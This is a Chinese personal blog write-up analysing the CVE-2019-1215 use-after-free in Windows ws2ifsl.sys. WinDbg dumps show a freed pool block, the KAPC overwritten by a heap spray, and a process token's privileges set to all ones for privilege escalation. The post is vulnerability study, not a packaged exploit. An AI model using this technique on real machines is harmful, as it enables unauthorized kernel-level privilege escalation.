##                            UAF漏洞 (cve-2019-1215)  ws2ifsl

#### 废话

​    这个漏洞19年末的时候看到的，大佬的分析和poc代码都放出来，本想着春节在家搞一搞，结果春节因为疫情，没啥心情，再着过完年后，一直在家上班，有空就尽量陪着小屁孩们，然后一年这么悲伤加恐惧中过完，去年6、7月份工作量猛然增加，也懒得分析了，就这么一直拖着，最近提一提，挤一挤学习一下。

​    为什么网上那么多分析报告，自己再重新分析一边，其实一直对UAF漏洞有点模糊，这个漏洞看完大佬的分析，感觉挺有意思的，就自己搞一下，深感里面涉及的东西是真多。

####  简介 

​     这个漏洞ws2ifsl.sys在处理来在ea信息时，关闭sock时会关闭之前创建的proc，造成之前proc创建的kapc的内存被重新利用。

​     测试时，这个漏洞环境刚好时win10 1903，ws2ifsl静态信息：

版本：  10.0.18362.1

md5:     E9A76A36CD6C9B94582BF04D6A8419C3

#### 分析过程

​    在ws2ifsl!CreateProcessFile函数内，创建了一个大小：0x108的pool：

<img src="https://kcufid.github.io/images/pic/cve-2019-1215/alloc_pool.png" style="zoom:80%;" />

在此结构0x30处，会初始化一个kapc:

<img src="https://kcufid.github.io/images/pic/cve-2019-1215/kapc.png" style="zoom:80%;" />

在windbg环境内的结构如下：（做一次快照，自己加固理解）

```
1: kd> db ffffe38970458db0 
ffffe389`70458db0  50 72 6f 63 00 00 00 00-d4 09 00 00 00 00 00 00  Proc............
ffffe389`70458dc0  c0 8d 45 70 89 e3 ff ff-c0 8d 45 70 89 e3 ff ff  ..Ep......Ep....
ffffe389`70458dd0  00 00 61 00 72 00 64 00-00 00 00 00 00 00 00 00  ..a.r.d.........
ffffe389`70458de0  12 00 58 00 6c 00 75 00-80 b0 75 73 89 e3 ff ff  ..X.l.u...us....
ffffe389`70458df0  50 00 72 00 6f 00 67 00-72 00 61 00 6d 00 20 00  P.r.o.g.r.a.m. .
ffffe389`70458e00  c0 12 8b 4f 03 f8 ff ff-d0 12 8b 4f 03 f8 ff ff  ...O.......O....
ffffe389`70458e10  22 22 22 02 00 00 00 00-44 44 44 04 00 00 00 00  """.....DDD.....
ffffe389`70458e20  73 00 5c 00 4d 00 69 00-63 00 72 00 6f 00 73 00  s.\.M.i.c.r.o.s.
```

在+0x30处，对应的是kapc：

```
1: kd> dt _KAPC ffffe38970458db0+30
hal!_KAPC
   +0x000 Type             : 0x12 ''
   +0x001 SpareByte0       : 0 ''
   +0x002 Size             : 0x58 'X'
   +0x003 SpareByte1       : 0 ''
   +0x004 SpareLong0       : 0x75006c
   +0x008 Thread           : 0xffffe389`7375b080 _KTHREAD
   +0x010 ApcListEntry     : _LIST_ENTRY [ 0x0067006f`00720050 - 0x0020006d`00610072 ]
   +0x020 Reserved         : [3] 0xfffff803`4f8b12c0 Void
   +0x038 NormalContext    : 0x00000000`04444444 Void
   +0x040 SystemArgument1  : 0x0069004d`005c0073 Void
   +0x048 SystemArgument2  : 0x0073006f`00720063 Void
   +0x050 ApcStateIndex    : 0 ''
   +0x051 ApcMode          : 1 ''
   +0x052 Inserted         : 0 ''

```

这是初始值，然后随便向这个procHandle发送点东西（DispatchReadWrite），初始化的apc将会加入队列（KeInsertQueueApc），通过CloseHandle procHandle会free掉，这个close一直没断下来，等到closehandle sockHandle的时候，他俩一起的，DispatchClose的功能很简单，就是ExFreePoolWithTag，把之前申请的poo给free掉。然后通过喷射，填充内存，把之前加入队列的apc带动起来。这个喷射，是真的妙，暂时没理解怎么就free的内存，就给铺上了。

 poc铺的数据块：

<img src="\images\pic\cve-2019-1215\writrepipe.png" alt="writrepipe" style="zoom:80%;" />

 覆盖的内存如下：

```
2: kd> db ffffe38970458db0
ffffe389`70458db0  78 37 8e 03 85 d1 ff ff-78 37 8e 03 85 d1 ff ff  x7......x7......
ffffe389`70458dc0  00 00 00 00 00 00 00 00-c0 6d 52 02 85 d1 ff ff  .........mR.....
ffffe389`70458dd0  00 00 00 00 d8 00 00 00-d8 00 00 00 73 00 6b 00  ............s.k.
ffffe389`70458de0  41 41 41 41 41 41 41 00-12 12 12 12 00 00 00 00  AAAAAAA.........
ffffe389`70458df0  28 b1 75 73 89 e3 ff ff-28 b1 75 73 89 e3 ff ff  (.us....(.us....
ffffe389`70458e00  50 23 41 49 03 f8 ff ff-00 00 b9 2f 0c 78 ff ff  P#AI......./.x..
ffffe389`70458e10  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffe389`70458e20  24 24 24 24 24 24 24 24-e8 36 a9 00 85 d1 ff ff  $$$$$$$$.6......
覆盖的apc：
2: kd> dt _KAPC ffffe38970458db0+30
hal!_KAPC
   +0x000 Type             : 0x41 'A'
   +0x001 SpareByte0       : 0x41 'A'
   +0x002 Size             : 0x41 'A'
   +0x003 SpareByte1       : 0x41 'A'
   +0x004 SpareLong0       : 0x414141
   +0x008 Thread           : 0x00000000`12121212 _KTHREAD
   +0x010 ApcListEntry     : _LIST_ENTRY [ 0xffffe389`7375b128 - 0xffffe389`7375b128 ]
   +0x020 Reserved         : [3] 0xfffff803`49412350 Void
   +0x038 NormalContext    : 0xffffffff`ffffffff Void
   +0x040 SystemArgument1  : 0x24242424`24242424 Void
   +0x048 SystemArgument2  : 0xffffd185`00a936e8 Void
   +0x050 ApcStateIndex    : 0 ''
   +0x051 ApcMode          : 0 ''
   +0x052 Inserted         : 0 ''
```

应该是这个apc被触发后(NtTestAlert)后，执行+0x20那个地址，为什么会调用这个地址，这个得再研究一下。

{dt 的时候，使用dt nt!_KAPC 会显示，0x20地址是，KernelRoutine，这就不难理解了。}

当然这个函数也没法直接断，系统频繁调用，也不可能直接断KiInsertQueueApc，也是频繁调用。此处放一个错误的地址，蓝屏后的堆栈调用：

```
1: kd> kp
 # Child-SP          RetAddr           Call Site
00 ffffcf88`72291ab8 fffff807`186a6492 nt!DbgBreakPointWithStatus
01 ffffcf88`72291ac0 fffff807`186a5b82 nt!KiBugCheckDebugBreak+0x12
02 ffffcf88`72291b20 fffff807`185bc917 nt!KeBugCheck2+0x952
03 ffffcf88`72292220 fffff807`185ce469 nt!KeBugCheckEx+0x107
04 ffffcf88`72292260 fffff807`185ce890 nt!KiBugCheckDispatch+0x69
05 ffffcf88`722923a0 fffff807`185ccc1f nt!KiFastFailDispatch+0xd0
06 ffffcf88`72292580 fffff807`185d8817 nt!KiRaiseSecurityCheckFailure+0x31f
07 ffffcf88`72292718 fffff807`1845362f nt!KiInsertQueueApc+0x18610b
08 ffffcf88`72292720 fffff807`18433958 nt!KiSchedulerApc+0x22f
09 ffffcf88`72292850 fffff807`18431b9a nt!KiDeliverApc+0x2e8
0a ffffcf88`72292910 fffff807`18430f54 nt!KiSwapThread+0x6ca
0b ffffcf88`722929b0 fffff807`1842bd10 nt!KiCommitThreadWait+0x144
0c ffffcf88`72292a50 fffff807`18a179af nt!KeDelayExecutionThread+0x4c0
0d ffffcf88`72292ad0 fffff807`185cde95 nt!NtDelayExecution+0x5f
0e ffffcf88`72292b00 00007ffb`c163c6e4 nt!KiSystemServiceCopyEnd+0x25
0f 00000088`e93ffd18 00007ffb`be8c6931 ntdll!NtDelayExecution+0x14
10 00000088`e93ffd20 00007ff6`9a07173b KERNELBASE!SleepEx+0xa1
11 00000088`e93ffdc0 00007ffb`bfca7944 CVE_2019_1215_ws2ifsl!APCThread2(void * lparam = 0x00000000`00000000)+0x6b
```

断点在写token那，即SeSetAccessStateGenericMapping函数内。当前测试时，进程的token地址时：0xFFFFD18500A936B0，然后对应的+0x40 (_SEP_TOKEN_PRIVILEGES),地址就是：FFFFD18500A936F0：

ba w1 FFFFD18500A936F0，断下：

<img src="\images\pic\cve-2019-1215\12.png" alt="12" style="zoom:100%;" />

![](\images\pic\cve-2019-1215\xx.png)

其中rax值：ffffd18500a936e8，这也是为什么第一次调用TriggerBug时，减了个8，调用这个函数，刚好赋值的地址：0xFFFFD18500A936F0

```
3: kd> db FFFFD18500A936B0
ffffd185`00a936b0  55 73 65 72 33 32 20 00-0e c1 02 00 00 00 00 00  User32 .........
ffffd185`00a936c0  fe f9 37 00 00 00 00 00-0f c4 02 00 00 00 00 00  ..7.............
ffffd185`00a936d0  00 00 00 00 00 00 00 00-ff ff ff ff ff ff ff 7f  ................
ffffd185`00a936e0  10 82 e1 73 89 e3 ff ff-75 83 12 00 00 00 00 00  ...s....u.......
ffffd185`00a936f0  ff ff ff ff ff ff ff ff-e8 36 a9 00 85 d1 ff ff  .........6......
ffffd185`00a93700  00 00 80 40 00 00 00 00-00 00 00 00 00 00 00 00  ...@............
ffffd185`00a93710  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffd185`00a93720  00 00 00 00 00 00 01 00-01 00 00 00 0f 00 00 00  ................
```

rcx的值：ffffe38970458de0，

```
3: kd> db ffffe38970458de0
ffffe389`70458de0  41 41 41 41 41 41 41 00-12 12 12 12 00 00 00 00  AAAAAAA.........
ffffe389`70458df0  28 b1 75 73 89 e3 ff ff-28 b1 75 73 89 e3 ff ff  (.us....(.us....
ffffe389`70458e00  50 23 41 49 03 f8 ff ff-00 00 b9 2f 0c 78 ff ff  P#AI......./.x..
ffffe389`70458e10  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffe389`70458e20  24 24 24 24 24 24 24 24-e8 36 a9 00 85 d1 ff ff  $$$$$$$$.6......
ffffe389`70458e30  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffe389`70458e40  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffe389`70458e50  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
```

因为触发一次只能修改8个字节，要修改_SEP_TOKEN_PRIVILEGES的前0x10字节，那就再漏洞一次。两次后token对应的数据：

```
2: kd> db FFFFD18500A936B0
ffffd185`00a936b0  55 73 65 72 33 32 20 00-0e c1 02 00 00 00 00 00  User32 .........
ffffd185`00a936c0  fe f9 37 00 00 00 00 00-0f c4 02 00 00 00 00 00  ..7.............
ffffd185`00a936d0  00 00 00 00 00 00 00 00-ff ff ff ff ff ff ff 7f  ................
ffffd185`00a936e0  10 82 e1 73 89 e3 ff ff-75 83 12 00 00 00 00 00  ...s....u.......
ffffd185`00a936f0  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffd185`00a93700  f0 36 a9 00 85 d1 ff ff-00 00 00 00 00 00 00 00  .6..............
ffffd185`00a93710  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffd185`00a93720  00 00 00 00 00 00 01 00-01 00 00 00 0f 00 00 00  ................

2: kd> dx -id 0,0,ffffe3896fa7e380 -r1 (*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffd18500a936f0))
(*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffd18500a936f0))                 [Type: _SEP_TOKEN_PRIVILEGES]
    [+0x000] Present          : 0xffffffffffffffff [Type: unsigned __int64]
    [+0x008] Enabled          : 0xffffffffffffffff [Type: unsigned __int64]
```

这样修改当前进程权限为：然后不再详叙，注入进程，运行shellcode等等。

#### 感想

​     1、漏洞层面理清了。其实刚开始的时候一直在想这个kapc是怎么调用起来的，传入的thread难道是要替换，结果现在想来，通过多次调试，传入的线程就是起到一个验证的作用。

​    2、触发的那个数据块还是有点模糊，apc调用后，执行的 SeSetAccessStateGenericMapping，参数rcx、rdx，怎么保证的参数能够赋上对应的数据。

​       写完文章后，想着理清第二个问题。第二个问题的关键点就是两个参数是怎么来的，刚开始以为是apc的那两个参数，发现是错误的，只有最后那个0xFF的参数，前一个地址，传入的是kapc的首地址。调试了一把nt!KiDeliverApc，真大，整不了。

​        下一步研究一下这个堆栈风水，分析的过程中搜索的，挺巧竟然乌云翻译的：https://wooyun.js.org/drops/%E7%BE%8A%E5%B9%B4%E5%86%85%E6%A0%B8%E5%A0%86%E9%A3%8E%E6%B0%B4%EF%BC%9A%20%E2%80%9CBig%20Kids%E2%80%99%20Pool%E2%80%9D%E4%B8%AD%E7%9A%84%E5%A0%86%E5%96%B7%E6%8A%80%E6%9C%AF.html  赞。想想乌云，唉，万恶的资本主义。



#### 参考

https://labs.bluefrostsecurity.de/blog/2020/01/07/cve-2019-1215-analysis-of-a-use-after-free-in-ws2ifsl/